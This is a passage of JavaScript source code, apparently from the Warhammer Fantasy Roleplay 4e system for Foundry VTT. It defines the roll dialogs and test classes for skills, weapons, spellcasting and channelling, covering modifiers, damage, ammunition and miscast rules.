    return this.unknownSkill ? this.unknownSkill : super.item || {}
  }
}

class SkillDialog extends CharacteristicDialog {

    subTemplate = "systems/wfrp4e/templates/dialog/skill-dialog.hbs";
    chatTemplate = "systems/wfrp4e/templates/chat/roll/skill-card.hbs"

    testClass = SkillTest

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["skill-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.skill
    }

    get extendedTest() 
    {
        return fromUuidSync(this.options.extended);
    }

    get skill() 
    {
      return this.data.skill;
    }

    static async setup(fields={}, data={}, options={})
    {
        let skill = data.skill;
        options.title = options.title || game.i18n.format("SkillTest", {skill: data.skill.name});
        options.title += options.appendTitle || "";

        if (data.skill.name == game.i18n.localize("NAME.Dodge"))    
        {
            options.dodge = true;
        }
        data.characteristic = skill.characteristic.key;
        data.hitLocationTable = game.wfrp4e.tables.getHitLocTable(data.targets[0]?.actor?.details?.hitLocationTable?.value || "hitloc");

        if (data.skill.id != "unknown")
        {
            data.scripts = data.scripts.concat(data.skill?.getScripts("dialog"));
        }
        if (options.reload)
        {
            data.scripts = data.scripts.concat(options.weapon?.ammo.getScripts("dialog"));
        }

        data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);

        return new Promise(resolve => {
            let dlg = new this(fields, data, resolve, options);
            if (options.bypass)
            {
                dlg.bypass();
            }
            else 
            {
                dlg.render(true);
            }
        })
    }

    async getData() 
    {
        let context = await super.getData();
        context.data.hitLoc = ["ws", "bs"].includes(context.data.characteristic);
        return context;
    }

    _constructTestData()
    {
        let data = super._constructTestData();
        data.skillName = this.data.skill?.name;
        data.item = this.data.skill?.id;
        data.characteristicToUse = this.data.characteristic;
        return data;
    }

    computeFields()
    {
        super.computeFields();   
        this._computeArmour();
    }

    _computeArmour()
    {
        let stealthPenaltyValue = 0;

        // Armor type penalties do not stack, only apply if you wear any of that type
        let wearingMail = false;
        let wearingPlate = false;

        for (let a of this.actor.itemTypes["armour"].filter(i => i.isEquipped)) {
            // For each armor, apply its specific penalty value, as well as marking down whether
            // it qualifies for armor type penalties (wearingMail/Plate)

            // Skip practical
            if (a.properties.qualities.practical) {
                continue;
            }

            if (a.armorType.value == "mail") {
                wearingMail = true;
            }
            if (a.armorType.value == "plate") {
                wearingPlate = true;
            }
        }

        // Apply armor type penalties at the end
        if (wearingMail || wearingPlate) {
            if (wearingMail) {
                stealthPenaltyValue += -10;
            }
            if (wearingPlate) {
                stealthPenaltyValue += -10;
            }

            if (this.item.name.includes(game.i18n.localize("NAME.Stealth"))) {
                if (stealthPenaltyValue) {
                    this.fields.modifier += stealthPenaltyValue;
                    this.tooltips.addModifier(stealthPenaltyValue, game.i18n.localize("SHEET.ArmourPenalties"));
                }
            }
        }
    }

    createBreakdown()
    {
        let breakdown = super.createBreakdown();
        if (this.skill?.system)
        {
            let skillValue = (this.skill?.system.advances.value + this.skill?.system.modifier.value) || 0;
            if (skillValue)
            {
                breakdown.skill = `${HandlebarsHelpers.numberFormat(skillValue, {hash :{sign: true}})} (${this.skill.name})`;
            }
        }
        return breakdown;
    }

    activateListeners(html)
    {
        super.activateListeners(html);

        html.find(".change-characteristic").change(ev => {
            this.data.characteristic = ev.currentTarget.value;
            this.render(true);
        });
    }

    // Backwards compatibility for effects
    get type() 
    {
        return "skill";
    }
}

class AttackTest extends TestWFRP {


  async computeResult() {
    await super.computeResult();

    this.computeProperties();

    await this.calculateDamage();

    return this.result;
  }

  async postTest()
  {
    await super.postTest();
    let target = this.targets[0];
    if (target && target.type != "vehicle" && this.result.hitloc) 
    {
      let impenetrable = false;
      let AP = target.status.armour[this.result.hitloc.result];
      for(let layer of AP.layers)
      {
        if (layer.impenetrable)
          impenetrable = true;
      }
      if (this.result.critical && impenetrable && this.result.roll % 2 != 0) {
        delete this.result.critical;
        this.result.nullcritical = `${game.i18n.localize("CHAT.CriticalsNullified")} (${game.i18n.localize("PROPERTY.Impenetrable")})`;
      }
    }
  }

  computeProperties()
  {
    if (this.failed) {
      // Dangerous weapons fumble on any failed tesst including a 9
      if (this.result.roll % 11 == 0 || this.result.roll == 100 || (this.item.properties.flaws.dangerous && this.result.roll.toString().includes("9"))) {
        this.result.fumble = game.i18n.localize("Fumble");
      }
      if (this.item.properties.flaws.unreliable)
        this.result.SL--;
      if (this.item.properties.qualities.practical)
        this.result.SL++;

      if (this.item.weaponGroup?.value == "throwing")
        this.result.scatter = game.i18n.localize("Scatter");
    }
    else // if success
    {
      if (this.item.properties.qualities.blast)
        this.result.other.push(`<a class='aoe-template' data-type="radius"><i class="fas fa-ruler-combined"></i>${this.item.properties.qualities.blast.value} yard Blast</a>`);

      if (this.result.roll % 11 == 0)
        this.result.critical = game.i18n.localize("Critical");

      // Impale weapons crit on 10s numbers
      if (this.item.properties.qualities.impale && this.result.roll % 10 == 0)
        this.result.critical = game.i18n.localize("Critical");

      if (this.result.critical && this.item.properties.qualities.slash)
      {
          this.result.other.push(`${game.i18n.format("PROPERTY.SlashAlert", {value : parseInt(this.item.properties.qualities.slash.value)})}`);
      }
    }
  }

  async calculateDamage(base)
  {
    let damageBreakdown = this.result.breakdown.damage;

    this.result.additionalDamage = this.preData.additionalDamage || 0;

    let damageToUse = base; // Start out normally, with SL being the basis of damage
    damageBreakdown.base = `${base} (${game.i18n.localize("SL")})`;
    
    if (this.useMount && this.actor.mount.characteristics.s.bonus > this.actor.characteristics.s.bonus)
    {
      let itemDamage = this.item.Damage;
      let mountDamage = this.item.mountDamage;

      this.result.damage = (0, eval)(mountDamage + Number(damageToUse));
      damageBreakdown.item = `+${itemDamage} (${this.item.system.damage?.value || this.item.system.specification.value})`;
      if (itemDamage != mountDamage)
      {
        damageBreakdown.other.push({label : game.i18n.localize("Mount"), value : mountDamage - itemDamage});
      }
    }
    else
    {
      this.result.damage = (0, eval)(this.item.Damage + Number(damageToUse));
      damageBreakdown.item = `+${this.item.Damage} (${this.item.system.damage?.value || this.item.system.specification.value})`;
    }

    if (this.result.charging && !this.result.other.includes(game.i18n.localize("Charging")))
    {
      this.result.other.push(game.i18n.localize("Charging"));
    }

    if ((this.item.properties.flaws.tiring && this.result.charging) || !this.item.properties.flaws.tiring) 
    {
      let unitValue = Number(this.result.roll.toString().split("").pop());
      unitValue = unitValue == 0 ? 10 : unitValue; // If unit value == 0, use 10

      if (this.item.properties.qualities.damaging && unitValue > Number(this.result.SL))
      {
        base = unitValue; // If damaging, instead use the unit value if it's higher
        damageBreakdown.base = `${unitValue} (${game.i18n.localize("Damaging")})`;
      }

      if (this.useMount && this.actor.mount.characteristics.s.bonus > this.actor.characteristics.s.bonus)
        this.result.damage = (0, eval)(this.item.mountDamage + Number(damageToUse));
      else
        this.result.damage = (0, eval)(this.item.Damage + Number(damageToUse));

      // Add unit die value to damage if impact
      if (this.item.properties.qualities.impact)
      {
        this.result.damage += unitValue;
        damageBreakdown.other.push({label : game.i18n.localize("PROPERTY.Impact"), value : unitValue});
      }
    }

    if (this.item.properties.qualities.spread)
    {
      let value = (Number(this.item.properties.qualities.spread.value) || 0);
      if (this.preData.options.rangeBand == game.i18n.localize("Point Blank"))
      {
        this.result.additionalDamage += value;        
        this.result.damage += value;
        damageBreakdown.other.push({label : `${game.i1n.localize("PROPERTY.Spread")} - ${game.i18n.localize("Point Blank")}` , value : value});
        this.preData.other.push(game.i18n.format("CHAT.SpreadPointBlank", {damage : value}));
      }
      else if (this.preData.options.rangeBand == game.i18n.localize("Extreme"))
      {
        this.result.additionalDamage -= value;        
        this.result.damage -= value;
        damageBreakdown.other.push({label : `${game.i1n.localize("PROPERTY.Spread")} - ${game.i18n.localize("Extreme")}` , value : -value});
        this.preData.other.push(game.i18n.format("CHAT.SpreadExtreme", {damage : value}));
      }
    }
  }
}

class WeaponTest extends AttackTest {

  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return
    this.preData.ammoId = data.ammo?.id; // TODO vehicle shit
    this.preData.charging = data.charging || false;
    this.preData.infighter = data.infighter || !!actor?.has(game.i18n.localize("NAME.Infighter"), "talent"); // I don't like this but it's really awkward to implement with scripts
    this.preData.resolute = data.resolute || 0;
    this.preData.dualWielding = data.dualWielding || false;

    this.computeTargetNumber();
  }

  computeTargetNumber() {
    let skill = this.item.system.getSkillToUse(this.actor);
    if (!skill)
      this.result.target = this.item.system.attackType == "ranged" ? this.actor.system.characteristics.bs.value : this.actor.system.characteristics.ws.value;
    else
      this.result.target = skill.total.value;

    super.computeTargetNumber();
  }

  async runPreEffects() {
    await super.runPreEffects();
    await Promise.all(this.actor.runScripts("preRollWeaponTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("preRollWeaponTest", { test: this, chatOptions: this.context.chatOptions }));
  }

  async runPostEffects() {
    await super.runPostEffects();
    await Promise.all(this.actor.runScripts("rollWeaponTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("rollWeaponTest", { test: this, chatOptions: this.context.chatOptions }));
    Hooks.call("wfrp4e:rollWeaponTest", this, this.context.chatOptions);
  }


  async roll() {

    if (this.options.dualWieldOffhand && this.options.offhandReverse)
      this.preData.roll = this.options.offhandReverse;

    await super.roll();
  }

  async computeResult()
  {
    await super.computeResult();
    this.computeMisfire();
  }


  async calculateDamage() {
    super.calculateDamage(this.result.SL);
    let weapon = this.weapon;

    if ((weapon.damage.dice || weapon.ammo?.damage.dice) && !this.result.additionalDamage) {
      let roll = await new Roll(weapon.damage.dice + `${weapon.ammo?.damage.dice ? "+" + weapon.ammo?.damage.dice : "" }`).roll();
      this.result.diceDamage = { value: roll.total, formula: roll.formula };
      this.preData.diceDamage = this.result.diceDamage;
      this.result.additionalDamage += roll.total;
      this.context.breakdown.damage.other.push({label : game.i18n.format("BREAKDOWN.Dice"), value : roll.total});
      this.preData.additionalDamage  = this.result.additionalDamage;
    }

    //@HOUSE
    if (game.settings.get("wfrp4e", "mooRangedDamage"))
    {
      game.wfrp4e.utility.logHomebrew("mooRangedDamage");
      if (weapon.isRanged)
      {
        let damageMod = (Math.floor(this.targetModifiers / 10) || 0);
        this.result.damage -= damageMod;
        this.context.breakdown.damage.other.push({label : game.i18n.localize("BREAKDOWN.Moo"), value : -damageMod});
        if (this.result.damage < 0)
          this.result.damage = 0;
      }
    }
    //@/HOUSE
  }

  async postTest() {
    await super.postTest();

    await this.handleAmmo();
    await this.handleDualWielder();

  }

  async handleAmmo()
  {
    // Only subtract ammo on the first run, so not when edited, not when rerolled
    if (this.item.system.ammo && this.item.system.consumesAmmo.value && !this.context.edited && !this.context.reroll) {
      await this.item.system.ammo.update({ "system.quantity.value": this.item.system.ammo.quantity.value - 1 });
    }
    else if (this.preData.ammoId && this.item.system.consumesAmmo.value && !this.context.edited && !this.context.reroll) {
      let ammo = this.actor.items.get(this.preData.ammoId);
      await ammo.update({ "system.quantity.value": this.actor.items.get(this.preData.ammoId).quantity.value - 1 });
    }


    if (this.item.system.loading && !this.context.edited && !this.context.reroll) {
      this.item.system.loaded.amt--;
      if (this.item.system.loaded.amt <= 0) {
        this.item.system.loaded.amt = 0;
        this.item.system.loaded.value = false;

        let item = await this.item.update({ "system.loaded.amt": this.item.system.loaded.amt, "system.loaded.value": this.item.system.loaded.value });
        await this.item.actor.checkReloadExtendedTest(item, this.actor);
      }
      else {
        await this.item.update({ "system.loaded.amt": this.item.system.loaded.amt });
      }
    }
  }

  async handleDualWielder() 
  {
    if (this.preData.dualWielding && !this.context.edited) {
      let offHandData = foundry.utils.duplicate(this.preData);

      if (!this.actor.hasSystemEffect("dualwielder"))
        await this.actor.addSystemEffect("dualwielder");

      if (this.succeeded) {
        let offhandWeapon = this.actor.getItemTypes("weapon").find(w => w.offhand.value);
        if (this.result.roll % 11 == 0 || this.result.roll == 100)
          delete offHandData.roll;
        else {
          let offhandRoll = this.result.roll.toString();
          if (offhandRoll.length == 1)
            offhandRoll = offhandRoll[0] + "0";
          else
            offhandRoll = offhandRoll[1] + offhandRoll[0];
          offHandData.roll = Number(offhandRoll);
        }

        this.actor.setupWeapon(offhandWeapon, { appendTitle: ` (${game.i18n.localize("SHEET.Offhand")})`, dualWieldOffhand: true, offhandReverse: offHandData.roll }).then(test => test.roll());
      }
    }
  }

  computeMisfire() {
    let weapon = this.weapon;
    // Blackpowder/engineering/explosive weapons misfire on an even fumble
    if (this.result.fumble && 
      ["blackpowder", "engineering", "explosives"].includes(weapon.system.weaponGroup.value) && 
      this.result.roll % 2 == 0) 
    {
      this.result.misfire = game.i18n.localize("Misfire");
      this.result.misfireDamage = (0, eval)(parseInt(this.result.roll.toString().split('').pop()) + weapon.system.Damage);
    }
  }

  get weapon() {
    return this.item
  }

  get vehicle() {
    if (this.options.vehicle)
      return WFRP_Utility.getSpeaker(this.options.vehicle)
  }

  get item() {
    let actor = this.vehicle || this.actor;
    if (typeof this.preData.item == "string")
      return actor.items.get(this.preData.item)
    else
      return new CONFIG.Item.documentClass(this.preData.item, { parent: actor })
  }
}

class AttackDialog extends SkillDialog  
{
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["weapon-roll-dialog"]);
        return options;
    }

    get attackType() {
        return this.item.attackType;
    }


    computeFields()
    {
        super.computeFields();
        if (!["roll", "none"].includes(this.fields.hitLocation))
        {
            this.fields.modifier -= 20;
            this.tooltips.addModifier(-20, game.i18n.localize('ROLL.CalledShot'));
        }
        if (game.settings.get("wfrp4e", "useGroupAdvantage"))
        {
          if (this.userEntry.charging)
          {
            this.fields.modifier += 10;
            this.tooltips.addModifier(10, game.i18n.localize('Charging'));
          }
        }
        
        let properties = this.item.properties;

        if (properties.qualities.accurate) 
        {
            this.fields.modifier += 10;
            this.tooltips.addModifier(10, game.i18n.localize("PROPERTY.Accurate"));
        }

        if (properties.qualities.precise) 
        {
            this.fields.successBonus += 1;
            this.tooltips.addSuccessBonus(1, game.i18n.localize("PROPERTY.Precise"));

        }
        if (properties.flaws.imprecise) 
        {
            this.fields.slBonus -= 1;
            this.tooltips.addSLBonus(-1, game.i18n.localize("PROPERTY.Imprecise"));
        }
    }

    _computeDefending(attacker) 
    {
        super._computeDefending(attacker);
        let properties = this.item.properties;

        if (this.actor.defensive) 
        {
            this.fields.slBonus += this.actor.defensive;
            this.tooltips.addSLBonus(this.actor.defensive, game.i18n.localize("PROPERTY.Defensive"));
        }

        //if attacker is fast, and the defender is either 1. using a melee trait to defend, or 2. using a weapon without fast
        if (attacker.test.item.properties?.qualities.fast && this.item.attackType == "melee" && !properties?.qualities.fast) 
        {
            this.fields.modifier += -10;
            this.tooltips.addModifier(-10, game.i18n.localize('CHAT.TestModifiers.FastWeapon'));
        }

        if (properties.flaws.unbalanced)
        {
            this.fields.slBonus -= 1;
            this.tooltips.addSLBonus(-1, game.i18n.localize("PROPERTY.Unbalanced"));
        }

        if(attacker.test.item.properties?.qualities?.wrap)
        {
            this.fields.slBonus -= 1;
            this.tooltips.addSLBonus(-1, game.i18n.localize('CHAT.TestModifiers.WrapDefend'));
        }

        //Size Differences
        let sizeDiff = game.wfrp4e.config.actorSizeNums[attacker.test.size] - this.actor.sizeNum;
        //Positive means attacker is larger, negative means defender is larger
        if (sizeDiff >= 1) {
            //Defending against a larger target with a weapon
            if (this.item.attackType == "melee") {
                let slBonus = (-2 * sizeDiff);
                this.fields.slBonus += slBonus;
                this.tooltips.addSLBonus(slBonus, game.i18n.localize('CHAT.TestModifiers.DefendingLarger'));
            }
        }
    }

    _computeTargets(target)
    {
        if (this.item.attackType == "ranged" && target.actor.statuses.has("engaged"))
        {
            this.fields.modifier -= 20;
            this.tooltips.addModifier(-20, game.i18n.localize("EFFECT.ShootingAtEngagedTarget"));
            this.options.engagedModifier = -20;
        }


        let sizeDiff = this.actor.sizeNum - target.actor.sizeNum;
        let sizeModifier = 0;
        // Attacking a larger creature with melee
        if (sizeDiff < 0 && (this.item.attackType == "melee" || target.actor.sizeNum <= 3)) 
        {
          sizeModifier += 10;
          this.tooltips.addModifier(10, game.i18n.localize('CHAT.TestModifiers.AttackingLarger'));
        }
        // Attacking a larger creature with ranged
        else if (this.item.attackType === "ranged")
        {
          if (target.actor.details.size.value == "tiny")
            sizeModifier -= 30;
          if (target.actor.details.size.value == "ltl")
            sizeModifier -= 20;
          if (target.actor.details.size.value == "sml")
            sizeModifier -= 10;
          if (target.actor.details.size.value == "lrg")
            sizeModifier += 20;
          if (target.actor.details.size.value == "enor")
            sizeModifier += 40;
          if (target.actor.details.size.value == "mnst")
            sizeModifier += 60;

          if (sizeModifier) 
          {
            const text = (game.i18n.format('CHAT.TestModifiers.ShootingSizeModifier', { size: game.wfrp4e.config.actorSizes[target.actor.details.size.value] }));
            this.tooltips.addModifier(sizeModifier, text);
          }
        }
        
        if (sizeModifier)
        {
          this.options.sizeModifier = sizeModifier;
          this.fields.modifier += sizeModifier;
        }


        // Attacking a smaller creature from a mount
        if (this.actor.isMounted && this.item.attackType == "melee") 
        {
            let mountSizeDiff = this.actor.mount.sizeNum - target.actor.sizeNum;
            if (target.actor.isMounted) 
            {                               // TODO this seems wrong
                mountSizeDiff = this.actor.mount.sizeNum - target.actor.sizeNum;
            }

            if (mountSizeDiff >= 1) 
            {
                this.fields.modifier += 20;
                this.tooltips.addModifier(20, game.i18n.localize('CHAT.TestModifiers.AttackerMountLarger'));
            }
        }
        // Attacking a creature on a larger mount
        else if (this.item.attackType == "melee" && target.actor.isMounted) 
        {
            let mountSizeDiff = target.actor.mount.sizeNum - this.actor.sizeNum;
            if (this.actor.isMounted) 
            {
                mountSizeDiff = target.sizeNum - this.actor.mount.sizeNum;
            }
            if (mountSizeDiff >= 1) 
            {
                if ((this.item.reachNum || 0) >= 5) 
                {
                    // TODO this tooltip won't show up because 0 value
                    this.tooltips.addModifier(0, `${game.i18n.localize('CHAT.TestModifiers.IgnoreDefenderMountLarger')}`);
                }
                else 
                {
                    this.tooltips.addModifier(-10, game.i18n.localize('CHAT.TestModifiers.DefenderMountLarger'));
                    this.fields.modifier -= 10;
                }
            }
        }
    }

    async _onInputChanged(ev) 
    {
      if (ev.currentTarget.name == "charging")
      {
        if (!game.settings.get("wfrp4e", "useGroupAdvantage"))
        {
          let advantageField = ui.activeWindow.form.querySelector("[name='advantage']");
          
          if(ev.currentTarget.checked)
          {
            advantageField.value = Number(advantageField.value) + 1;
          }
          else 
          {
            advantageField.value = Math.max(0, Number(advantageField.value) - 1);
          }
          advantageField.dispatchEvent(new Event('change'));
        }
        else 
        {
          this.flags.charging = ev.currentTarget.checked;
        }
      }
        super._onInputChanged(ev);
    }
}

class WeaponDialog extends AttackDialog {


    subTemplate = "systems/wfrp4e/templates/dialog/weapon-dialog.hbs";
    chatTemplate = "systems/wfrp4e/templates/chat/roll/weapon-card.hbs"
    testClass = WeaponTest;


    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["weapon-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.data.weapon
    }

    get weapon() 
    {
      return this.item;
    }

    static async setup(fields={}, data={}, options={})
    {
        if (!data.weapon.id)
        {
            data.weapon = new CONFIG.Item.documentClass(data.weapon, { parent: data.actor });
        }
        let weapon = data.weapon;
        data.skill = weapon.system.getSkillToUse(data.actor);
        data.characteristic = data.skill?.system.characteristic.key || (weapon.attackType == "ranged" ? "bs" : "ws");

        options.title = options.title || game.i18n.localize("WeaponTest") + " - " + weapon.name;
        options.title += options.appendTitle || "";

      if (weapon.attackType == "ranged") {
        // If Ranged, default to Ballistic Skill, but check to see if the actor has the specific skill for the weapon
        // skillCharList.push({ char: true, key: "bs", name: game.i18n.localize("CHAR.BS") })
        if (weapon.consumesAmmo.value && weapon.ammunitionGroup.value != "none" && weapon.ammunitionGroup.value) {
          // Check to see if they have ammo if appropriate
          if (options.ammo)
            data.ammo = options.ammo.find(a => a.id == weapon.currentAmmo.value);
          if (!data.ammo)
            data.ammo = data.actor.items.get(weapon.currentAmmo.value);
  
          if (!data.ammo || !weapon.currentAmmo.value || data.ammo.quantity.value == 0) {
            AudioHelper.play({ src: `${game.settings.get("wfrp4e", "soundPath")}no.wav` }, false);
            ui.notifications.error(game.i18n.localize("ErrorNoAmmo"));
            return
          }
  
        }
        else if (weapon.consumesAmmo.value && weapon.quantity.value == 0) {
          // If this executes, it means it uses its own quantity for ammo (e.g. throwing), which it has none of
          AudioPlayer.play({ src: `${game.settings.get("wfrp4e", "soundPath")}no.wav` }, false);
          ui.notifications.error(game.i18n.localize("ErrorNoAmmo"));
          return;
        }
        else {
          // If this executes, it means it uses its own quantity for ammo (e.g. throwing)
          data.ammo = weapon;
        }
  
  
        if (weapon.loading && !weapon.loaded.value) {
          await data.actor.rollReloadTest(weapon);
          ui.notifications.notify(game.i18n.localize("ErrorNotLoaded"));
          return ({ abort: true })
        }
      }

      if (weapon.attackType == "melee")
      {
        data.chargingOption = true;
      }
      
      data.hitLocationTable = game.wfrp4e.tables.getHitLocTable(data.targets[0]?.actor?.details?.hitLocationTable?.value || "hitloc");
      data.dualWieldingOption = data.actor.showDualWielding(weapon);

      data.scripts = data.scripts.concat(data.weapon?.getScripts("dialog"), data.skill?.getScripts("dialog") || []);
      data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);


      return new Promise(resolve => {
        let dlg = new this(fields, data, resolve, options);
        if (options.bypass)
        {
            dlg.bypass();
        }
        else 
        {
            dlg.render(true);
        }
    })
  }

  _constructTestData()
  {
      let data = super._constructTestData();
      data.item = this.data.weapon.id || this.data.weapon.toObject();
      return data;
  }

  computeFields() 
  {
    super.computeFields();

    if (this.actor.flags.useless.rArm && this.item.system.usesHands.includes("rArm") || this.actor.flags.useless.lArm && this.item.system.usesHands.includes("lArm"))
    {
      this.abort = true;
      ui.notifications.error("ERROR.CannotUseArm", {localize : true});
    }

    if (this.item.offhand.value && !this.item.twohanded.value && !(this.item.weaponGroup.value == "parry" && this.item.properties.qualities.defensive)) 
    {
      this.fields.modifier += -20;
      this.tooltips.addModifier(-20, game.i18n.localize("SHEET.Offhand"));

      const ambiMod = Math.min(20, this.actor.flags.ambi * 10); // TODO could be handled by ambidextrous effect 
      this.fields.modifier += ambiMod;
      if (this.actor.flags.ambi) {
        this.tooltips.addModifier(ambiMod, game.i18n.localize("NAME.Ambi"));
      }
    }
  }

  _computeTargets(target) 
  {
    super._computeTargets(target);
    this._computeRangeModifiers(target);
  }

  _computeRangeModifiers(target) 
  {
    let weapon = this.weapon;

    let token = this.actor.getActiveTokens()[0];

    if (!game.settings.get("wfrp4e", "rangeAutoCalculation") || !token || !weapon.range?.bands)
      return 0

    let distance = canvas.grid.measureDistances([{ ray: new Ray({ x: token.center.x, y: token.center.y }, { x: target.center.x, y: target.center.y }) }], { gridSpaces: true })[0];
    let currentBand;

    for (let band in weapon.range.bands) 
    {
      if (distance >= weapon.range.bands[band].range[0] && distance <= weapon.range.bands[band].range[1]) 
      {
        currentBand = band;
        this.options.rangeBand = band;
        break;
      }
    }

    let engagedEffect = this.actor.statuses.has("engaged");
    if (engagedEffect) 
    {
      let engagedMod = Math.min(0, weapon.range.bands[currentBand]?.modifier || 0);
      if (engagedMod)
      {
        this.fields.modifier += engagedMod;
        this.tooltips.addModifier(engagedMod, game.i18n.localize("EFFECT.ShooterEngaged"));
      }
    }
    else 
    {
      let rangeMod = weapon.range.bands[currentBand]?.modifier || 0;
      if (rangeMod) 
      {
        this.fields.modifier += rangeMod;
        this.tooltips.addModifier(rangeMod, `${game.i18n.localize("Range")} - ${currentBand}`);
      }
    }
  }

  // Backwards compatibility for effects
  get type() 
  {
    return "weapon";
  }
}

class CastDialog extends SkillDialog {

    subTemplate = "systems/wfrp4e/templates/dialog/spell-dialog.hbs";
    testClass = game.settings.get("wfrp4e", "useWoMOvercast") ? game.wfrp4e.rolls.WomCastTest : game.wfrp4e.rolls.CastTest
    chatTemplate = "systems/wfrp4e/templates/chat/roll/spell-card.hbs"

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["spell-roll-dialog"]);
        return options;
    }

    get item()
    {
      return this.data.spell
    }

    get spell() 
    {
      return this.item;
    }

    static async setup(fields={}, data={}, options={})
    {
        let spell = data.spell;
        options.title = options.title || game.i18n.localize("CastingTest") + " - " + spell.name;
        options.title += options.appendTitle || "";

        data.skill = spell.skillToUse;
        data.characteristic = data.skill?.system?.characteristic?.key || "int";

        data.scripts = data.scripts.concat(data.spell?.getScripts("dialog"), data.skill?.getScripts("dialog") || []);
        data.scripts = data.scripts.concat(data.actor.system.vehicle?.getScripts("dialog") || []);


        return new Promise(resolve => {
            let dlg = new this(fields, data, resolve, options);
            if (options.bypass)
            {
                dlg.bypass();
            }
            else 
            {
                dlg.render(true);
            }
        })
    }

    _constructTestData()
    {
        let data = super._constructTestData();
        data.item = this.data.spell.id;
        return data;
    }
    
    _computeAdvantage()
    {
        // @HOUSE
        if (game.settings.get("wfrp4e", "mooMagicAdvantage"))
        {
            return 0;
        }
        else 
        {
            return super._computeAdvantage();
        }
    }

    // Backwards compatibility for effects
    get type() 
    {
        return "cast";
    }
}

class ChannelTest extends TestWFRP {

  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return

    this.preData.unofficialGrimoire = data.unofficialGrimoire;
    this.data.preData.malignantInfluence = data.malignantInfluence;
    this.data.preData.skill = data.skill?.id;
    this.data.context.channelUntilSuccess = data.channelUntilSuccess;

    this.computeTargetNumber();
  }

  computeTargetNumber() {
    let skill = this.actor.items.get(this.preData.skill);
    if (!skill)
      this.result.target = this.actor.system.characteristics[this.characteristicKey].value;
    else
      this.result.target = skill.total.value;

    super.computeTargetNumber();
  }

  async runPreEffects() {
    await super.runPreEffects();
    await Promise.all(this.actor.runScripts("preChannellingTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("preChannellingTest", { test: this, chatOptions: this.context.chatOptions }));

  }

  async runPostEffects() {
    await super.runPostEffects();
    await Promise.all(this.actor.runScripts("rollChannellingTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("rollChannellingTest", { test: this, chatOptions: this.context.chatOptions }));
    Hooks.call("wfrp4e:rollChannelTest", this, this.context.chatOptions);
  }

  async computeResult() {
    await super.computeResult();
    let miscastCounter = 0;
    this.result.SL;
    this.result.tooltips.miscast = [];

    // Witchcraft automatically miscast
    if (this.item.lore.value == "witchcraft") {
      miscastCounter++;
      this.result.other.push(game.i18n.localize("CHAT.WitchcraftMiscast"));
      this.result.tooltips.miscast.push(game.i18n.localize("CHAT.AutoWitchcraftMiscast"));
    }

    // Test itself was failed
    if (this.failed) 
    {
      this.result.description = game.i18n.localize("ROLL.ChannelFailed");
      // Major Miscast on fumble
      if (this.result.roll % 11 == 0 ||
         (this.result.roll % 10 == 0 && !game.settings.get("wfrp4e", "useWoMChannelling")) || // If WoM channelling, 10s don't cause miscasts
          this.result.roll == 100)
      {

        this.result.color_red = true;
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.FumbleMiscast"));
        //@HOUSE
        if (this.preData.unofficialGrimoire) 
        {
          game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
          miscastCounter += 1;
          if(this.result.roll == 100 || this.result.roll == 99) 
          {
            this.item.cn.value * (-1);
            miscastCounter += 1;
          }
        //@HOUSE
        } 
        else 
        {
          if (game.settings.get("wfrp4e", "useWoMChannelling")) // Fumble is only minor when using WoM Channelling
          {
            miscastCounter += 1;
          }
          else 
          {
            miscastCounter += 2;
          }

          //@HOUSE
          if (this.result.roll == 100 && game.settings.get("wfrp4e", "mooCatastrophicMiscasts")) {
            game.wfrp4e.utility.logHomebrew("mooCatastrophicMiscasts");
            miscastCounter++;
          }
          //@/HOUSE
        }
      }
    }
    else // Successs - add SL to spell for further use
    {
      this.result.description = game.i18n.localize("ROLL.ChannelSuccess");

      // Critical Channel - miscast and set SL gained to CN
      if (this.result.roll % 11 == 0) {
        this.result.color_green = true;
        this.result.criticalchannell = game.i18n.localize("ROLL.CritChannel");
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.CritChannelMiscast"));
        miscastCounter++;
        this.spell.flags.criticalchannell = true; // Locally apply the critical channell flag
      }
    }

    miscastCounter += this._checkInfluences() || 0;
    this._handleMiscasts(miscastCounter);
    this.result.tooltips.miscast = this.result.tooltips.miscast.join("\n");
  }

  _checkInfluences()
  {
    if (!this.preData.malignantInfluence) 
    {
      return 0
    }

    // If malignant influence AND roll has an 8 in the ones digit, miscast
    if (
      (Number(this.result.roll.toString().split('').pop()) == 8 && !game.settings.get("wfrp4e", "useWoMInfluences")) || 
      (this.failed && game.settings.get("wfrp4e", "useWoMInfluences"))) 
    {
      this.result.tooltips.miscast.push(game.i18n.localize("CHAT.MalignantInfluence"));
      return 1;
    }
  }

  async postTest() {
    //@/HOUSE

    
      if (this.preData.unofficialGrimoire) {
        game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
        if (this.preData.unofficialGrimoire.ingredientMode != 'none' && this.hasIngredient && this.item.ingredient?.quantity.value > 0 && !this.context.edited && !this.context.reroll) {
          await this.item.ingredient.update({ "system.quantity.value": this.item.ingredient.quantity.value - 1 });
          this.result.ingredientConsumed = true;
          ChatMessage.create({ speaker: this.data.context.speaker, content: game.i18n.localize("ConsumedIngredient") });
        }
        //@/HOUSE
      } 
      else if (game.settings.get("wfrp4e", "channellingIngredients"))
      {
        // Find ingredient being used, if any
        if (this.hasIngredient && this.item.ingredient?.quantity.value > 0 && !this.context.edited && !this.context.reroll)
          await this.item.ingredient.update({ "system.quantity.value": this.item.ingredient.quantity.value - 1 });
      }

    let SL = Number(this.result.SL);

    if (this.succeeded)
    {
      // Optional Rule: If SL in extended test is -/+0, counts as -/+1
